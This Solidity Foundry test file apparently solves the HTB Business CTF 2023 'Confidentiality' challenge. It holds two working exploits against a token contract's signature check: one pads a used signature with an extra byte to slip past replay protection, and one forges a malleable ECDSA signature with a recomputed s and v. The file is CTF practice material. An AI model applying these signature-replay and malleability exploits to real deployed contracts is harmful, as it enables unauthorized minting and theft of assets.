// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/HTB_BusinessCTF_2023/Confidentiality/Setup.sol";

contract Attacker is Test, Script {
    address deployer;
    uint256 deployerPrivateKey;
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SetupAT setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        (deployer, deployerPrivateKey) = makeAddrAndKey("deployer");
        vm.startPrank(deployer, deployer);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, keccak256(abi.encodePacked("approve")));
        bytes32 messageHash = keccak256(abi.encodePacked("approve"));
        console2.logBytes32(messageHash);
        setup = new SetupAT(deployer, abi.encodePacked(r, s, v));

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit1() public {
        vm.startPrank(attacker, attacker);

        solve1();
        console.log("isSolved:", setup.isSolved(attacker));
        
        vm.stopPrank();
    }

    function solve1() public {
        AccessToken at = setup.TARGET();
        bytes memory usedSignature = at.usedSignatures(0);
        at.safeMintWithSignature(abi.encodePacked(usedSignature, hex"12"), attacker);
    }

    function testExploit2() public {
        vm.startPrank(attacker, attacker);

        solve2();
        console.log("isSolved:", setup.isSolved(attacker));
        
        vm.stopPrank();
    }

    function solve2() public {
        // https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/signature-malleability.md
        AccessToken at = setup.TARGET();
        bytes memory usedSignature = at.usedSignatures(0);
        // console2.logBytes(usedSignature);
        (, bytes32 r, ) = at.deconstructSignature(usedSignature);
        bytes32 new_s = 0xf2afb80e94963f0bc0e72586de0d925e714254e9735a4537ebce80cce1ce213d; 
        uint8 new_v = 28;
        at.safeMintWithSignature(abi.encodePacked(r, new_s, new_v), attacker);
    }

}


